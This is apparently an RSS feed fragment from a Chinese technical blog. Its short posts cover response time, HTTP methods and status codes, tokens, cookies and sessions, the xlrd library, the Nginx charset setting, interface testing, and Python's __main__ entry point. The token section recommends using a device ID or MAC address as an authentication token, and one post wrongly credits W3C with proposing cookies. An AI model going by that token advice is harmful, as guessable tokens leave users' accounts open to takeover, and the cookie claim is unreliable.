        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%93%8D%E5%BA%94%E6%97%B6%E9%97%B4%E7%9A%84%E7%BB%84%E6%88%90/</guid>
        <description>&lt;p&gt;响应时间RT把整个过程分三个部分：呈现时间，数据传输时间和系统处理时间。&lt;/p&gt;
&lt;h2 id=&#34;1呈现时间&#34;&gt;1.呈现时间&lt;/h2&gt;
&lt;p&gt;主要说的是浏览器对接收到数据的一个处理展示的过程。我们会发现同一台电脑同一个网站，通过Chrome去访问，页面的呈现速度会比IE略快，呈现时间不仅与浏览器有关，还和承载它的操作系统有关，以及电脑硬件（比如CPU、 内存）&lt;/p&gt;
&lt;h2 id=&#34;2数据传输时间&#34;&gt;2.数据传输时间&lt;/h2&gt;
&lt;p&gt;我们发送一个请求需要时间，系统处理完后返回给我们也需要时间。&lt;/p&gt;
&lt;p&gt;互联网是个网，就是有着相同的起点与终点，信息也有可能走的不同的路线。即使你发出的请求都能成功发出，但到目的地的时候，已经不能叫并发了。这也是为什么我们在一般做性能测试时，一般要强调要在局域网中进行。当然，有些性能测试需要在互联网中时行。但它们重点不是验证服务器端的最大处理能力。&lt;/p&gt;
&lt;h2 id=&#34;3系统处理时间&#34;&gt;3.系统处理时间&lt;/h2&gt;
&lt;p&gt;当系统得到请求后会对请求进行处理并将结果返回。我们进行性能测试的目的主要就是验证系统的处理时间&lt;/p&gt;
&lt;h2 id=&#34;4测试方法&#34;&gt;4.测试方法&lt;/h2&gt;
&lt;p&gt;因为前面的呈现时间和数据传输时间都是我们不可控制的，用户使用的电脑及浏览器千差万别，用户的网络状况千差万别。我们唯一能控制的就是将系统的处理请求的时间缩到最短。&lt;/p&gt;
&lt;p&gt;一般测试工具都应该屏蔽响应的呈现过程，只是模拟多用户并发请求，计算用户得到响应的时间，不会将服务器的每个响应做客户端渲染呈现。&lt;/p&gt;
&lt;p&gt;对于数据传输的问题，这也是我要强调的性能测试要在局域网中进行，在局域网中一般不会受到数据带宽的限制。所以，可以对数据的传输时间忽略不计。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>随记—什么是 Web 请求</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-web-%E8%AF%B7%E6%B1%82/</link>
        <pubDate>Thu, 17 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-web-%E8%AF%B7%E6%B1%82/</guid>
        <description>&lt;h2 id=&#34;1post和get的区别&#34;&gt;1.POST和GET的区别&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;发送时都包含请求头请求参数，POST多了请求body&lt;/li&gt;
&lt;li&gt;GET多用来查询，请求参数放在URL中，不会对服务器上的内容产生作用。POST用来提交，数据放入body中&lt;/li&gt;
&lt;li&gt;GET是直接添加到URL后面的，直接就可以在URL中看到内容，而POST是放在报文内部的，用户无法直接看到&lt;/li&gt;
&lt;li&gt;GET提交的数据长度是有限制的，因为URL长度有限制，具体的长度限制视浏览器而定。而POST没有&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2响应状态码&#34;&gt;2.响应状态码&lt;/h2&gt;
&lt;p&gt;访问一个网页时，浏览器会向web服务器发出请求。此网页所在的服务器会返回一个包含HTTP状态码的信息头用以响应浏览器的请求。常见的状态码分类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1XX- 信息型，服务器收到请求，需要请求者继续操作。&lt;/li&gt;
&lt;li&gt;2XX- 成功型，请求成功收到，理解并处理。&lt;/li&gt;
&lt;li&gt;3XX - 重定向，需要进一步的操作以完成请求。&lt;/li&gt;
&lt;li&gt;4XX - 客户端错误，请求包含语法错误或无法完成请求。&lt;/li&gt;
&lt;li&gt;5XX - 服务器错误，服务器在处理请求的过程中发生了错误。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3常见状态码&#34;&gt;3.常见状态码&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;200 - 客户端请求成功&lt;/li&gt;
&lt;li&gt;301 - 资源（网页等）被永久转移到其它URL&lt;/li&gt;
&lt;li&gt;302 - 临时跳转&lt;/li&gt;
&lt;li&gt;400 - 客户端请求有语法错误，不能被服务器所理解&lt;/li&gt;
&lt;li&gt;401 - 请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用&lt;/li&gt;
&lt;li&gt;404 - 请求资源不存在，可能是输入了错误的URL&lt;/li&gt;
&lt;li&gt;500 - 服务器内部发生了不可预期的错误&lt;/li&gt;
&lt;li&gt;503 - 服务器当前不能处理客户端的请求，一段时间后可能恢复正常&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4什么是token&#34;&gt;4.什么是Token&lt;/h2&gt;
&lt;p&gt;Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。推荐用设备号/设备mac地址作为Token或者使用session值作为Token&lt;/p&gt;
&lt;h2 id=&#34;5cookie与session&#34;&gt;5.Cookie与Session&lt;/h2&gt;
&lt;p&gt;首先我们需要知道HTTP协议的一个重要特点——“无状态”，数据交换完成，服务端和客户端就断开连接了，所以请求之间没有相关联系，每一个请求都是一个独立的新请求，为了实现状态保留的，保证前后正常通信，需要在客户端或服务器端存储与会话相关的数据,所以设计了这两个机制——Cookie与Session&lt;/p&gt;
&lt;p&gt;Cookie是由W3C组织提出的保存在客户端本地，方便下次访问服务端时直接放到请求报文头中，如登录的cookie，下次访问同一网站时，用户不必再次输入用户名和密码就已经直接登录.&lt;/p&gt;
&lt;p&gt;Session是保存在服务器上用来记录用户状态的机制。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。Session在用户第一次访问服务器的时候自动创建。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。一般客户端和服务端通过一个SessionID来进行沟通，为了防止不同的用户之间出现冲突和重复，SessionID一般是一个32或者48个字节的随机字符串&lt;/p&gt;
&lt;h2 id=&#34;6cookie与session的区别&#34;&gt;6.Cookie与Session的区别&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;存放位置不同：cookie数据存放在客户端（浏览器）；session数据放在服务器端，一般存储在内存中，但是SessionID存储在客户端cookie中。&lt;/li&gt;
&lt;li&gt;cookie由浏览器存储在本地，安全有风险，不宜存储敏感信息，如密码等。&lt;/li&gt;
&lt;li&gt;session会在一定时间内保存在服务器上，访问较多时，影响服务器性能。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Python—xlrd</title>
        <link>https://ac-lm.github.io/posts/python/pythonxlrd/</link>
        <pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonxlrd/</guid>
        <description>&lt;h2 id=&#34;1什么是xlrd库&#34;&gt;1.什么是xlrd库&lt;/h2&gt;
&lt;p&gt;python 中操作 Excel 表格主要用到 xlrd 和 xlwt 这两个库，xlrd 库提供读取功能，xlwt 库提供写入功能，但 python 中不存在对 Excel 表格进行修改的库。（注意在版本1.3.0中，这两个库不再支持 xlsx 格式的表格文件，如要使用请指定版本1.2.0）&lt;/p&gt;
&lt;h2 id=&#34;2安装&#34;&gt;2.安装&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pip install xlrd&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.2.0&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3使用&#34;&gt;3.使用&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; xlrd
data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; xlrd&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;open_workbook(filename)  &lt;span style=&#34;color:#75715e&#34;&gt;# 文件名以及路径&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;导入和打开文档后，必须先定位到 sheet，才能进行下一步操作，程序只有在获取对应的 sheet 之后，才能进行对行和列以及单元格的操作&lt;/p&gt;
&lt;h3 id=&#34;a获取工作表&#34;&gt;a.获取工作表&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;table &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sheets()[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]          &lt;span style=&#34;color:#75715e&#34;&gt;# 通过索引顺序获取&lt;/span&gt;
table &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sheet_by_index(sheet_indx)  &lt;span style=&#34;color:#75715e&#34;&gt;# 通过索引顺序获取&lt;/span&gt;
table &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sheet_by_name(sheet_name) &lt;span style=&#34;color:#75715e&#34;&gt;# 通过名称获取&lt;/span&gt;
names &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sheet_names()    &lt;span style=&#34;color:#75715e&#34;&gt;# 返回 book 中所有工作表的名字&lt;/span&gt;
data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sheet_loaded(sheet_name &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; indx)   &lt;span style=&#34;color:#75715e&#34;&gt;# 检查某个sheet是否导入完毕&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b对行的操作&#34;&gt;b.对行的操作&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;nrows &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;nrows  &lt;span style=&#34;color:#75715e&#34;&gt;# 获取该sheet中的有效行数&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;row(rowx)  &lt;span style=&#34;color:#75715e&#34;&gt;# 返回由该行中所有的单元格对象组成的列表&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;row_slice(rowx)  &lt;span style=&#34;color:#75715e&#34;&gt;#返回由该列中所有的单元格对象组成的列表&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;row_types(rowx, start_colx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, end_colx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)    &lt;span style=&#34;color:#75715e&#34;&gt;# 返回由该行中所有单元格的数据类型组成的列表&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;row_values(rowx, start_colx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, end_colx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)   &lt;span style=&#34;color:#75715e&#34;&gt;# 返回由该行中所有单元格的数据组成的列表&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;row_len(rowx) &lt;span style=&#34;color:#75715e&#34;&gt;# 返回该列的有效单元格长度&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c对列的操作&#34;&gt;c.对列的操作&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;ncols &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ncols   &lt;span style=&#34;color:#75715e&#34;&gt;# 获取列表的有效列数&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;col(colx, start_rowx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, end_rowx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# 返回由该列中所有的单元格对象组成的列表&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;col_slice(colx, start_rowx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, end_rowx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)  &lt;span style=&#34;color:#75715e&#34;&gt;# 返回由该列中所有的单元格对象组成的列表&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;col_types(colx, start_rowx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, end_rowx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)    &lt;span style=&#34;color:#75715e&#34;&gt;# 返回由该列中所有单元格的数据类型组成的列表&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;col_values(colx, start_rowx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, end_rowx&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;)   &lt;span style=&#34;color:#75715e&#34;&gt;# 返回由该列中所有单元格的数据组成的列表&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;d对单元格的操作&#34;&gt;d.对单元格的操作&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cell(rowx,colx)   &lt;span style=&#34;color:#75715e&#34;&gt;# 返回单元格对象&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cell_type(rowx,colx)    &lt;span style=&#34;color:#75715e&#34;&gt;# 返回单元格中的数据类型&lt;/span&gt;
table&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;cell_value(rowx,colx)   &lt;span style=&#34;color:#75715e&#34;&gt;# 返回单元格中的数据&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Web服务器—Nginx 解决乱码</title>
        <link>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A8nginx-%E8%A7%A3%E5%86%B3%E4%B9%B1%E7%A0%81/</link>
        <pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E6%9C%8D%E5%8A%A1%E5%99%A8nginx-%E8%A7%A3%E5%86%B3%E4%B9%B1%E7%A0%81/</guid>
        <description>&lt;h2 id=&#34;1问题&#34;&gt;1.问题&lt;/h2&gt;
&lt;p&gt;当 Nginx 服务器运行时，有时用户访问中文内容会出现乱码&lt;/p&gt;
&lt;h2 id=&#34;2解决&#34;&gt;2.解决&lt;/h2&gt;
&lt;p&gt;此时需要修改 Nginx 的 server 配置内容，增加字段：&lt;code&gt;charset utf-8;&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;server&lt;/span&gt; {
    &lt;span style=&#34;color:#f92672&#34;&gt;listen&lt;/span&gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;server_name&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;you.example.com&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;charset&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;utf-8&lt;/span&gt;;
    
    &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/examples&lt;/span&gt; {
        &lt;span style=&#34;color:#f92672&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;;
    }

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—为什么要做接口测试</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%81%9A%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/</link>
        <pubDate>Wed, 16 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%81%9A%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/</guid>
        <description>&lt;h2 id=&#34;1怎么理解接口&#34;&gt;1.怎么理解接口&lt;/h2&gt;
&lt;p&gt;举个例子，假如我们在开发1个bug管理系统，该系统需要拿到公司的所有开发和测试人员的信息，这样开发和测试人员不用注册都可以登录进去了，这应该很好理解。&lt;/p&gt;
&lt;p&gt;那么这些人员的信息储存在哪里呢？一般存储在hr系统里。现在的需求更加明确了，我们要到hr系统中去拿到人员信息，获取hr系统中的人员资源。&lt;/p&gt;
&lt;p&gt;直接把hr系统的数据库拷贝一份放到bug管理系统里，不过这样不好，因为数据的同步会有点麻烦；还可以直接连hr系统的数据库去查，这样也不太好，这样我们就需要了解hr系统的数据存储结构和逻辑，一旦hr系统的数据字段发生改变，bug管理系统也要去改，以便同步。&lt;/p&gt;
&lt;p&gt;比较好的做法是，hr系统暴露一些接口，通过这些接口去获取人员信息资源，这样bug系统就不需要关心hr系统的数据存储实现。&lt;/p&gt;
&lt;p&gt;这些接口可能是这样的：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;登录的接口，提供人员的用户名和密码，去hr系统中判断该人员是否存在，如果存在，验证用户名和密码，如果验证通过就返回1个token，该token就是这个人员的通行证，通过token可以登录到bug管理系统中去；&lt;/li&gt;
&lt;li&gt;获取人员信息的接口，返回该人员的职位：测试还是开发，以及用户名，昵称等信息；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;综上：接口是不同系统或模块之间资源交流的工具&lt;/p&gt;
&lt;h2 id=&#34;2接口测试实际上是黑盒测试&#34;&gt;2.接口测试实际上是黑盒测试&lt;/h2&gt;
&lt;p&gt;作为黑盒测试，基本的测试思路是通过输入和输出判断被测系统或者对象的逻辑。&lt;/p&gt;
&lt;p&gt;获取人员的信息，我需要把人员的用户名传给hr系统接口，这样hr系统的接口会返回给我用户的一些更加具体的信息。这里的输入是用户名，输出是用户的详细信息。&lt;/p&gt;
&lt;h2 id=&#34;3为什么要做接口测试&#34;&gt;3.为什么要做接口测试&lt;/h2&gt;
&lt;p&gt;大部分系统和产品中，资源一般都是产品的核心，比如微信核心资源就是通讯录关系链和聊天记录等，因此资源是必测的。接口是不同系统或模块之间操作资源方式，所以接口测试是必要的&lt;/p&gt;
&lt;p&gt;另外接口中大部分的内容是数据，通过数据的对比我们能推测到系统和产品的逻辑，测接口就是测逻辑。&lt;/p&gt;
&lt;p&gt;最后接口中的返回相对单纯，不像web页面，html代码中有太多UI的东西，UI最不稳定，变化太快，接口相对稳定一点点，但是里面的干扰信息更少，断言相对容易很多。&lt;/p&gt;
&lt;p&gt;接口测试用例怎么写，建议遵循3A原则。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Arrange: 测试用例执行之前需要准备测试数据，包括需要输入的数据及存量数据&lt;/li&gt;
&lt;li&gt;Act: 通过不同的参数来调用接口，并拿到返回&lt;/li&gt;
&lt;li&gt;Assert: 必须做断言，否则用例就没有任何意义了&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4什么是mock-server&#34;&gt;4.什么是Mock Server&lt;/h2&gt;
&lt;p&gt;前端和后端往往节奏是不一致的。前端很多情况下需要等待后台的API开发完成后才能进行开发联调和测试，这种前后端不对称就造成了前后端团队节奏不一致，从而造成整个项目/产品交付/发布延期。&lt;/p&gt;
&lt;p&gt;有一种解决方案的思路是前后端先约定好后端提供的API接口的细节，前端人员自行先模拟出这些后端的实现，当然这些实现是假的，不过前端可以去调用这些假的实现，而且能拿到返回，这样一来前端就不需要等待后端开发完成才开始工作了。&lt;/p&gt;
&lt;p&gt;但是这样还是会有问题，前端实现的假的API没办法迅速反映出后端的变化。简单来说就是后端可能在约定好的API接口上进行了些许修改，而没有知会前端人员，这样前端的假的API实现并没有相应更新，在正式联调时就会出现问题。&lt;/p&gt;
&lt;p&gt;像这种假的API实现，不管是前端实现的还是后端去实现的，我们可以称之为mock server&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;mock表示这个API返回的数据是假的，仅作为测试用的&lt;/li&gt;
&lt;li&gt;server表示需要启动服务，说到底这是一个服务程序&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5契约测试&#34;&gt;5.契约测试&lt;/h2&gt;
&lt;p&gt;由于前后端往往有一些信息不对称，导致约定的API可能在前后端都会发生变化，所以保证前后端的一致性就成了一个挑战。这时候就有人提出了契约测试，大致思想是前后端共用一份契约，约定了API的细节，前后端的任何变化都需要先修改契约，然后通过契约去通知前后端团队，统一更新实现。这也是契约精神的表现。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—程序的入口</title>
        <link>https://ac-lm.github.io/posts/python/python%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%85%A5%E5%8F%A3/</link>
        <pubDate>Tue, 15 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%85%A5%E5%8F%A3/</guid>
        <description>&lt;h2 id=&#34;1前言&#34;&gt;1.前言&lt;/h2&gt;
&lt;p&gt;我们都知道 C 或者 Java 程序运行必然有主程序入口 main 函数，而 python 却不同，即便没有主程序入口，程序一样可以自上而下对代码块依次运行，如果要实现 C 那样的主程序入口 main 函数，我们可以使用以下的判断&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;if __name__==&#39;__main__&#39;:
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2语义解释&#34;&gt;2.语义解释&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;__name__&lt;/code&gt;是 python 的内置属性，属于系统全局变量，每一个 py 文件都有一个属于自己的&lt;code&gt;__name__&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果 py 文件作为模块被导入，那么&lt;code&gt;__name__&lt;/code&gt;就是该 py 文件的文件名(也称模块名)&lt;/li&gt;
&lt;li&gt;如果 py 文件直接运行时，那么&lt;code&gt;__name__&lt;/code&gt;默认等于字符串 main&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;也就是当一个 py 文件作为启动文件时，该文件的内置属性&lt;code&gt;__name__&lt;/code&gt;等于&lt;code&gt;__main__&lt;/code&gt;，而作为导入模块时，该模块的&lt;code&gt;__name__&lt;/code&gt;等于文件名(也称模块名字)，我们对&lt;code&gt;__name__&lt;/code&gt;进行判断，就可以仅执行启动文件的程序，而不会执行导入模块的程序(函数与类除外，这类归于调用)&lt;/p&gt;
&lt;h2 id=&#34;3作用&#34;&gt;3.作用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;作为启动 py 文件的 main 函数入口&lt;/li&gt;
&lt;li&gt;一个项目中必然会包含多个模块文件，每个模块文件在写完代码之后会做一些简单的测试用于检测 bug 或者对自己的函数调用写一个简单的示例，而恰到好处的是，编写这样一个入口函数既不会影响你测试代码，也不会影响别人调用你的接口函数，一举多得&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>随记—什么是接口</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF%E6%8E%A5%E5%8F%A3/</link>
        <pubDate>Mon, 14 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF%E6%8E%A5%E5%8F%A3/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/yyhh/p/6083159.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;接口测试总结  @猴子请来的救兵 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1什么是接口&#34;&gt;1.什么是接口&lt;/h2&gt;
&lt;p&gt;我们先来看一张图，从这张图来了解什么是接口。&lt;/p&gt;
&lt;p&gt;如图中 A 线，A 线指向一个电灯的开关，这个电灯的开关就可以称为接口。它有两个状态——开和关，我们可以通过选择不同的参数来实现电灯的开关。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291717260.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291717260.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;实际我们知道电灯的开关其实是通过零线、火线来操控的，而接口呢，其实就是把这些复杂的操作简化了，让你看到的只有一个开关。而我们做接口测试也只需要测试这个开关就可以完成任务。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当你访问 http://127.0.0.1:8080/light?opt=open ，让零线、火线连通，此时灯亮。&lt;/li&gt;
&lt;li&gt;当你访问 http://127.0.0.1:8080/light?opt=close ，让零线、火线断开，此时灯灭。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2接口的结构&#34;&gt;2.接口的结构&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;一个URL就是一个接口&lt;/strong&gt;，接下来需要理解一下HTTP的URL是怎么组成为一个接口的，如图：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291717511.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291717511.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;请求协议&lt;/strong&gt;：如 http — 普通的http请求，https — 加密的http请求，ftp — 文件传输协议&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;请求IP&lt;/strong&gt;：提供接口的系统所部署的服务器地址&lt;/li&gt;
